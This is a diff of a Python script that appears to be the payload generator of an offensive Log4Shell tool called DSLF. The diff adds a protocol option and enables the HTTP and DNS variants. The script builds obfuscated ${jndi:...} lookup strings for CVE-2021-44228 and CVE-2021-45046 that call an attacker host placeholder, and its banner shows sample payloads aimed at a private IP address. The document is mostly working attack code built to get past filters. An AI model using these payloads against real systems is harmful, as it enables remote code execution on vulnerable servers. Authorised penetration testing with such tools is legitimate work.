@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
-import time
+import argparse, time
 from termcolor import cprint
 
 combinations = ["key", "${::-key}", "${lower:key}", "${upper:key}"]
 tailer_cve_2021_44228 = '://{{EVIL}}:{{PORT}}/a}'
 tailer_cve_2021_45046 = '://127.0.0.1#{{EVIL}}:{{PORT}}/a}'
 
-def generate_payloads():
-
+def generate_payloads(proto):
   jndi = []
   for i in combinations:
     txt_i = ''
@@ -28,57 +27,59 @@ def generate_payloads():
   protocol = []
   
 
-  for i in combinations:
-    txt_i = ''
-    txt_i = i.replace('key', 'l')
+  if proto == 'ldap' or proto == 'all':
+    for i in combinations:
+      txt_i = ''
+      txt_i = i.replace('key', 'l')
 
-    for j in combinations:
-      txt_j = txt_i + j.replace('key', 'd')
+      for j in combinations:
+        txt_j = txt_i + j.replace('key', 'd')
 
-      for k in combinations:
-        txt_k = txt_j + k.replace('key', 'a')
+        for k in combinations:
+          txt_k = txt_j + k.replace('key', 'a')
 
-        for l in combinations:
-          txt_l = txt_k + l.replace('key', 'p')
-          protocol.append(txt_l + tailer_cve_2021_44228)
-          protocol.append(txt_l + tailer_cve_2021_45046)
-          txt_l = ''
-      txt_k = ''
-    txt_j = ''
+          for l in combinations:
+            txt_l = txt_k + l.replace('key', 'p')
+            protocol.append(txt_l + tailer_cve_2021_44228)
+            protocol.append(txt_l + tailer_cve_2021_45046)
+            txt_l = ''
+        txt_k = ''
+      txt_j = ''
 
-  """  
-  for i in combinations:
-    txt_i = ''
-    txt_i = i.replace('key', 'h')
+  if proto == 'http' or proto == 'all':
+    for i in combinations:
+      txt_i = ''
+      txt_i = i.replace('key', 'h')
 
-    for j in combinations:
-      txt_j = txt_i + j.replace('key', 't')
+      for j in combinations:
+        txt_j = txt_i + j.replace('key', 't')
 
-      for k in combinations:
-        txt_k = txt_j + k.replace('key', 't')
+        for k in combinations:
+          txt_k = txt_j + k.replace('key', 't')
 
-        for l in combinations:
-          txt_l = txt_k + l.replace('key', 'p')
-          protocol.append(txt_l + tailer_cve_2021_44228)
-          protocol.append(txt_l + tailer_cve_2021_45046)
-          txt_l = ''
-      txt_k = ''
-    txt_j = ''
+          for l in combinations:
+            txt_l = txt_k + l.replace('key', 'p')
+            protocol.append(txt_l + tailer_cve_2021_44228)
+            protocol.append(txt_l + tailer_cve_2021_45046)
+            txt_l = ''
+        txt_k = ''
+      txt_j = ''
   
-  for i in combinations:
-    txt_i = ''
-    txt_i = i.replace('key', 'd')
+  if proto == 'dns' or proto == 'all':
+    for i in combinations:
+      txt_i = ''
+      txt_i = i.replace('key', 'd')
 
-    for j in combinations:
-      txt_j = txt_i + j.replace('key', 'n')
+      for j in combinations:
+        txt_j = txt_i + j.replace('key', 'n')
 
-      for k in combinations:
-        txt_k = txt_j + k.replace('key', 's')
-        protocol.append(txt_k + tailer_cve_2021_44228)
-        protocol.append(txt_k + tailer_cve_2021_45046)
-      txt_k = ''
-    txt_j = ''
-  """
+        for k in combinations:
+          txt_k = txt_j + k.replace('key', 's')
+          protocol.append(txt_k + tailer_cve_2021_44228)
+          protocol.append(txt_k + tailer_cve_2021_45046)
+        txt_k = ''
+      txt_j = ''
+  
 
   for j in jndi:
    for p in protocol:
@@ -86,6 +87,12 @@ def generate_payloads():
 
 
 def main():
+  parser = argparse.ArgumentParser()
+  parser.add_argument('--protocol', action='store', dest='protocol', required=True, help='ldap, dns, http or all')
+  args = parser.parse_args()
+
+  _protocol = args.protocol
+ 
   print('')
   cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
   cprint('[•] Author: Julien GARAVET', 'green')
@@ -97,12 +104,16 @@ def main():
   cprint('[*] PGM - Payload Generator Module - Intels', 'green', attrs=['bold'])
   cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://192.168.1.242:1389/a}', 'green')
   cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#192.168.1.242:1389/a}', 'green')
-  time.sleep(4)
+  time.sleep(2)
+  print('')
+  cprint('[+] PGM - Payload Generator Module - Settings', 'yellow', attrs=['bold'])
+  cprint(f'[+] Protocol      {_protocol}', 'yellow')
+  time.sleep(1)
   print('')
   cprint('[!] PGM - Payload Generator Module - Starting', 'cyan', attrs=['bold'])
   time.sleep(2)
 
-  payloads = generate_payloads()
+  payloads = generate_payloads(_protocol)
 
 
 if __name__ == "__main__":
